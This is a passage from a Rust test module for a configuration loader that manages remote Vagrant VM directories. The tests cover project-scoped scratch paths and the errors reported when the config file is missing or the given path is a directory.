        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"/srv/\"\n";
        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
    }

    #[test]
    fn scratch_dir_is_scoped_to_the_project() {
        // Without the project segment, `scratch pr-1` from
        // two projects lands in one directory and the second
        // boot overwrites the first's `.vagrant/`.
        assert_eq!(
            good().remote_scratch_dir(&scratch("pr-1234")),
            "~/vms/scratch/phren/pr-1234"
        );
    }

    #[test]
    fn scratch_dirs_of_two_projects_do_not_collide() {
        let a = good();
        let src = "host = \"frosti\"\nproject = \"ledgerstone\"\n";
        let b = parse(src).unwrap();
        let name = scratch("pr-1");
        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
    }

    #[test]
    fn load_reports_missing_file() {
        let path = Path::new("definitely-not-here-bombyx.toml");
        let err = Config::load(path).unwrap_err();
        assert!(matches!(err, ConfigError::NotFound(_)));
        assert!(err.to_string().contains("config file not found"));
    }

    #[test]
    fn load_reads_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bombyx.toml");
        std::fs::write(&path, minimal()).unwrap();
        assert_eq!(Config::load(&path).unwrap().project, "phren");
    }

    #[test]
    fn load_reports_a_directory_as_not_a_file() {
        // Was a `Read` error carrying whatever the OS said,
        // which differs per platform ("Is a directory" on Unix,
        // "Access is denied" on Windows) and explains nothing.
        // The type check that keeps a symlinked overlay from
        // being read now answers this case first, and says what
        // is actually wrong.
        let dir = tempfile::tempdir().unwrap();
        let err = Config::load(dir.path()).unwrap_err();
        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
    }
}
